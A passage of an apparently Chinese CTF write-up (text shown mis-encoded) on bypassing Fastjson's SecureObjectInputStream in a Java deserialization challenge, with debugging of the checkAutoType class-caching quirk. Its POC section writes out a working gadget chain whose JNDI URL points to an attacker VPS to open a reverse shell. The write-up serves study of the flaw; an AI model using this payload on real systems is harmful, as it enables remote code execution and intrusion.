#resolveClass</span><br></pre></td></tr></table></figure></div><p>å…³æ³¨ä¸€ä¸‹resolveClass</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> name.lastIndexOf(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">            name = name.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span> &amp;&amp; name.charAt(<span class="number">0</span>) == <span class="string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="number">1</span>) == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">            name = name.substring(<span class="number">1</span>, name.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ParserConfig.global.checkAutoType(name, <span class="literal">null</span>, Feature.SupportAutoType.mask);<span class="comment">//é‡ç‚¹ï¼Œè°ƒç”¨äº†checkAutoTypeæ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ååºåˆ—åŒ–å¤±è´¥çš„å¤§å¤šæ•°åŸå› éƒ½æ˜¯checkAutoTypeå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºäº†JSONExceptionå¼‚å¸¸</p></blockquote><p>è¿™ä¸ªå¼‚å¸¸å¤§æ¦‚å­—ç¬¦ä¸²æ˜¯</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span> constructor not found. <span class="keyword">class</span> <span class="title class_">xxxxx</span></span><br></pre></td></tr></table></figure></div><p>è¿™æ ·çš„è¯ä¹‹å‰çš„é“¾å­å°±æ‰“ä¸é€šäº†ï¼ŒåŸæ¥æœ‰Fastjsonååºåˆ—åŒ–çš„é“¾å­æ€è·¯æ˜¯ä»<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>ï¼Œè¿›è€Œæœ€åèƒ½è§¦å‘ä»»æ„ç±»çš„getter(å°±æ˜¯ç±»çš„æ–¹æ³•åä»¥getå¼€å¤´çš„)ï¼Œå›çœ‹è¿™é¢˜ç»™çš„MyBeanï¼Œé‡Œé¢æœ‰ä¸ª<code>getConnect</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.conn.connect();</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//   private JMXConnector conn;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>åªè¦æˆ‘ä»¬èƒ½è§¦å‘getConnectï¼Œå°†connè®¾ç½®ä¸ºRMIConnectorï¼Œå¯ä»¥è§¦å‘JNDIæ³¨å…¥ï¼Œä¹‹åä¹Ÿå°±èƒ½åå¼¹shelläº†</p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jmxurl</span> <span class="operator">=</span> <span class="string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;</span><br><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(jmxurl);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">com.ctf.ezser.bean.<span class="type">MyBean</span> <span class="variable">mb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="string">&quot;sssaaaa&quot;</span>,rmi);</span><br><span class="line"></span><br><span class="line">com.alibaba.fastjson.<span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">com</span>.alibaba.fastjson.JSONArray();</span><br><span class="line">jsonArray.add(mb);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">valfield.set(val, jsonArray);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">oos.writeObject(val);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure></div><h3 id="ç„å­¦äº‹ä»¶"><a href="#ç„å­¦äº‹ä»¶" class="headerlink" title="ç„å­¦äº‹ä»¶"></a>ç„å­¦äº‹ä»¶</h3><p>æŒ‰ç†æ¥è¯´ï¼Œæ ¹æ®ä¸Šè¿°é“¾å­æ„é€ çš„ååºåˆ—åŒ–åº”è¯¥ä¼šè¢«SecureObjectInputStreamæ‹¦æˆªï¼Œè¿›è€Œæ‰§è¡Œ<code>checkAutoType</code>ç„¶åæŠ›å‡ºJSONExceptionå¼‚å¸¸ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œä½†ç¥å¥‡çš„æ˜¯å‰ä¸¤æ¬¡ååºåˆ—åŒ–ä¸€å®šå¤±è´¥ï¼Œè€Œä»ç¬¬ä¸‰æ¬¡å¼€å§‹å°±èƒ½æˆåŠŸå¹¶åå¼¹shellã€‚å¹¶ä¸”å®˜æ–¹wpä¹Ÿç”¨çš„è¿™æ¡é“¾å­ï¼Œä½†å†™å¾—è¿‡äºç®€çŸ­ï¼Œçœ‹å† å†›é˜Ÿçš„wpè¯´æ˜¯fjçš„éšæœºæ„é€ å‡½æ•°é—®é¢˜ï¼Œåæ¥è°ƒäº†ä¸€ä¸‹æ„Ÿè§‰å¯èƒ½ä¸æ˜¯è¿™ä¸ªåŸå› </p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237675.png"                      alt="image-20230505012846237"                ><figcaption>image-20230505012846237</figcaption></figure></p><p>ä¸€å¼€å§‹ä»¥ä¸ºä¸‰æ¬¡åªæ˜¯å·§åˆï¼Œåæ¥æ¯æ¬¡éªŒè¯éƒ½æ˜¯ä¸‰æ¬¡ã€‚å¹¶ä¸”ç¬¬ä¸€æ¬¡æ˜¯<code>default constructor not found. class xxx.RMIConnector</code>ç¬¬äºŒæ¬¡æ˜¯<code>default constructor not found. class xxx.JMXServiceURL</code></p><p>è¿™é‡Œå…ˆæä¸€ä¸‹checkAutoTypeé€šè¿‡typeNameæ‰¾ç±»çš„ä¸‰ç§æ–¹å¼</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//ğŸŒŸ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = typeMapping.get(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç»è¿‡æµ‹è¯•ï¼Œæœ€ä¸»è¦çš„æ–¹æ³•æ˜¯<code>TypeUtils.getClassFromMapping</code>è¿™ä¸ªæ–¹æ³•ä¼šå»TypeUtilsçš„mappingsæˆå‘˜é‡Œæ‰¾æ˜¯å¦æœ‰ä»¥typeNameä¸ºNameçš„ç±»ï¼ˆğŸŒŸğŸŒŸè¿™ä¸ªå¾ˆé‡è¦ è®°ä¸€ä¸‹ï¼‰mappingsæ˜¯é™æ€ç§æœ‰æˆå‘˜ï¼Œåœ¨åˆå§‹åŒ–æ—¶å°±æ”¾å…¥äº†107ä¸ªå¸¸è§ç±»ï¼ˆä¹Ÿæ˜¯SecureObjectInputStreamè®¤ä¸ºæ˜¯å®‰å…¨çš„ç±»ï¼‰</p></blockquote><p>è°ƒçš„è¿‡ç¨‹ä¸­å‘ç°ä¸‰æ¬¡æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œè¿™ä¸ªmappingsæˆå‘˜çš„sizeåˆ†åˆ«æ˜¯108ã€109ã€110ï¼Œè€Œåœ¨110æ—¶ååºåˆ—åŒ–æˆåŠŸï¼Œæƒ³å¿…å¤§å®¶çœ‹åˆ°è¿™é‡Œéƒ½èƒ½å‘ç°è¿™ä¸ªå…³é”®ç‚¹äº†ï¼Œä¹Ÿèƒ½çŒœæµ‹åˆ°å‰ä¸¤æ¬¡å·¥ä½œæ˜¯æŠŠæŠ›å‡ºå¼‚å¸¸æ²¡æ‰¾åˆ°é‚£ä¸ªç±»æ·»åŠ è¿›mappings</p><h2 id="0x03-è°ƒè¯•åˆ†æ"><a href="#0x03-è°ƒè¯•åˆ†æ" class="headerlink" title="0x03 è°ƒè¯•åˆ†æ"></a>0x03 è°ƒè¯•åˆ†æ</h2><p>ç†è®ºä¸Šæ˜¯è¯´å¾—é€šäº†ï¼Œè¿˜å¾—æ˜¯è°ƒè¯•ä¸€ä¸‹æ¥éªŒè¯</p><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><p>è¿™é¢˜é‡Œèƒ½ä¼ å…¥checkAutoTypeå»å¯»æ‰¾çš„éåŸç”Ÿç±»åªæœ‰</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.ctf.ezser.bean.MyBean <span class="comment">//ååºåˆ—åŒ–ç»ˆç‚¹ï¼Œè¢«è°ƒç”¨getConnect-ã€‹this.conn.connect();</span></span><br><span class="line">javax.management.remote.rmi.RMIConnector <span class="comment">//ä¼ å…¥MyBeanæ„é€ å‡½æ•°ç»™connèµ‹å€¼</span></span><br><span class="line">javax.management.remote.JMXServiceURL  <span class="comment">//ç”¨äºä¼ å…¥RMIConnectoræ„é€ å‡½æ•°</span></span><br></pre></td></tr></table></figure></div><h3 id="å¼‚å¸¸ä¿¡å·å¯»æ‰¾"><a href="#å¼‚å¸¸ä¿¡å·å¯»æ‰¾" class="headerlink" title="å¼‚å¸¸ä¿¡å·å¯»æ‰¾"></a>å¼‚å¸¸ä¿¡å·å¯»æ‰¾</h3><p>é¦–å…ˆå…ˆæ‰¾ä¸€ä¸‹è¿™ä¸ªä¸€ç›´æŠ¥é”™çš„<code>default constructor not found. class xxx</code>å­—æ®µï¼Œæ‰¾å‡ºæ¥æ˜¯åœ¨<code>JavaBeanInfo#build</code>æ–¹æ³•çš„æŸå¤„</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((!kotlin)</span><br><span class="line">            &amp;&amp; !clazz.getName().equals(<span class="string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="literal">null</span>, creatorConstructor, <span class="literal">null</span>, <span class="literal">null</span>, jsonType, fieldList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;default constructor not found. &quot;</span> + clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>åœ¨è¿™é¢˜çš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­kotlinéƒ½ä¸ºfalseï¼Œå› æ­¤å…³æ³¨ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œç»è°ƒè¯•ï¼Œèµ°åˆ°è¿™ä¸€æ­¥çš„clazzéƒ½ä¸ä¼šæ˜¯<code>javax.servlet.http.Cookie</code>ï¼Œè€Œæ˜¯ä¸Šé¢ä¸‰ä¸ªå‰ææ¡ä»¶ä¸­çš„åä¸¤ä¸ª</p></blockquote><p>checkAutoTypeæ–¹æ³•åç»­ä¼šåˆ›å»ºä¸€ä¸ªJavaBeanInfoè°ƒç”¨clazzæ–¹æ³•ï¼Œä¸è¿‡å‰ææ˜¯å‰ä¸€ä¸ªifæ²¡æœ‰æˆåŠŸçš„returnè·³å‡ºå‡½æ•°ï¼Œä»ä¸‹é¢ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœä¸‰ç§æ–¹æ³•éƒ½æ‰¾ä¸åˆ°classï¼Œä¹Ÿå°±ä¸ä¼šæå‰é€€å‡º</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = typeMapping.get(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...ğŸŒŸğŸŒŸ</span></span><br><span class="line">  <span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">  &#125;<span class="comment">//***å¤„</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">    <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è‹¥æ²¡æœ‰æå‰é€€å‡ºä¼šæ¥åˆ°ä¸Šé¢æ ‡è¯†çš„<code>***</code>å¤„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ“ä½œï¼ŒæŠŠè¿˜æ²¡æ‰¾åˆ°çš„ç±»çš„ç±»åtypeNameæ·»åŠ è¿›TypeUtilsçš„mappingsä¸­ï¼Œä½¿ç”¨ç±»åŠ è½½å™¨åŠ è½½è¯¥ç±»å¹¶èµ‹å€¼ç»™clazzï¼Œè¿™é‡Œå¯ä»¥ç®€å•çœ‹ä¸€ä¸‹TypeUtils.loadClasså…³é”®éƒ¨åˆ†</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line"> clazz = classLoader.loadClass(className);</span><br><span class="line"> <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">     mappings.put(className, clazz);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ€»ç»“ä¸€ä¸‹ä¼ å…¥<code>ParserConifg#checkAutoType</code>çš„ç±»åä¼šç»å†ä»¥ä¸‹è¿‡ç¨‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ç®€å•çš„ç±»åæ£€æŸ¥ï¼Œè‹¥å¤„äºé»‘åå•åˆ™æŠ›å‡ºå¼‚å¸¸ autoType is not support xxx</span><br><span class="line"><span class="number">2.</span>ä½¿ç”¨ä¸‰ç§æ–¹æ³•é€šè¿‡ç±»åæ¥åŠ è½½ç±»ï¼š</span><br><span class="line">        TypeUtils.getClassFormMappings (åŸºæœ¬éƒ½é€šè¿‡è¿™ä¸ªæ–¹æ³•æ‰¾åˆ°)</span><br><span class="line">        IdentityHashMap.findClass</span><br><span class="line">        ConcurrentHashMap.get</span><br><span class="line"><span class="number">3.</span>è‹¥æ‰¾åˆ°ï¼Œä¼šè¿›å…¥ä»¥ä¸‹<span class="keyword">if</span>è¿›è€Œ<span class="keyword">return</span>æ‰¾åˆ°çš„ç±»æå‰é€€å‡ºcheckAutoTypeå‡½æ•°</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">4.</span>ç»§ç»­æ‰§è¡Œï¼Œé€šè¿‡TypeUtilsçš„loadClassæ–¹æ³•åˆ©ç”¨ç±»åŠ è½½å™¨æ‰¾åˆ°ç±»ï¼Œå¹¶å°†å½“å‰ç±»åŠ å…¥TypeUtilsçš„mappingsä¸­</span><br><span class="line"><span class="number">5.</span>è°ƒç”¨JavaBeanInfoçš„buildæ–¹æ³•ï¼Œä¼ å…¥å½“å‰ç±»ï¼Œå½“ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ <span class="keyword">default</span> constructor not found. xxxx</span><br></pre></td></tr></table></figure></div><h3 id="ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–"><a href="#ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–" class="headerlink" title="ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–"></a>ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–</h3><p>é¦–å…ˆæ˜¯å…¥å£ç‚¹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div><p>æ¥ç€æ¥åˆ°JSONArray#readObject</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(<span class="keyword">final</span> java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      JSONObject.SecureObjectInputStream.ensureFields();</span><br><span class="line">      <span class="keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;</span><br><span class="line">          <span class="type">ObjectInputStream</span> <span class="variable">secIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>.SecureObjectInputStream(in);</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              secIn.defaultReadObject();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">catch</span> (java.io.NotActiveException e) &#123;</span><br><span class="line">              <span class="comment">// skip</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="comment">//ã€‚ã€‚ã€‚</span></span><br></pre></td></tr></table></figure></div><p>ä¹‹åå°±è¢«<code>SecureObjectInputStream</code>åŠ«æŒäº†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237433.png"                      alt="image-20230505020221637"                ><figcaption>image-20230505020221637</figcaption></figure></p><p>ç›´æ¥æ¥åˆ°æœ€å…³é”®çš„checkAutoTypeæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å…ˆæ‰¾çš„æ˜¯MyBean</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237274.png"                      alt="image-20230505020313917"                ><figcaption>image-20230505020313917</figcaption></figure></p><p>è·Ÿè¿›checkAutoTypeæ–¹æ³•ï¼Œå‰é¢éƒ¨åˆ†è·³è¿‡ï¼Œç›´æ¥æ¥ä¸ªç»å…¸ä¸‰ä¸ªæ–¹æ³•å¯»æ‰¾ç±»</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237845.png"                      alt="image-20230505020425672"                ><figcaption>image-20230505020425672</figcaption></figure></p><p>è¿™é‡Œå¯ä»¥å…ˆè·Ÿè¿›ä¸€ä¸‹getClassFromMappingæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„Mappingsï¼ˆsizeï¼š107ï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237915.png"                      alt="image-20230505020521779"                ><figcaption>image-20230505020521779</figcaption></figure></p><p>ç»è¿‡ä¸‰ä¸ªæ–¹æ³•ï¼Œä»ç„¶æ²¡æœ‰æ‰¾åˆ°ç±»ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ¥ä¸‹æ¥ä¸€å®šä¼šå»åˆ°JavaBeanInfoçš„buildæ–¹æ³•ä¸­(å¼‚å¸¸æŠ›å‡ºç‚¹)ï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰ä¼šå…ˆé€šè¿‡Typeutilsçš„loadClassæ–¹æ³•æ‰¾åˆ°ç±»ï¼Œå¹¶æ·»åŠ mappingsçš„æ•°é‡</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>MyBeanè¢«æ·»åŠ ï¼Œsizeå˜ä¸º108</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238540.png"                      alt="image-20230505020903956"                ><figcaption>image-20230505020903956</figcaption></figure></p><p>ä¹‹åå°±æ¥åˆ°äº†è¿™ä¸ªæ­»äº¡å¼‚å¸¸æŠ›å‡ºç‚¹JavaBeanInfoçš„buildæ–¹æ³•ï¼Œä½†ä½ ä¼šæƒŠå¥‡çš„å‘ç°ï¼Œå¹¶æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œç¨‹åºç»§ç»­èµ°åˆ°äº†ä¸‹ä¸€ä¸ªç±»RMIConnectorä¼ å…¥checkAutoTypeæ–¹æ³•ï¼Œå…¶å®æ˜¯å› ä¸ºè¿™ä¸ªifçš„æ¡ä»¶ä¸æ»¡è¶³ï¼Œbuildå‡½æ•°æå‰è¿”å›</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238797.png"  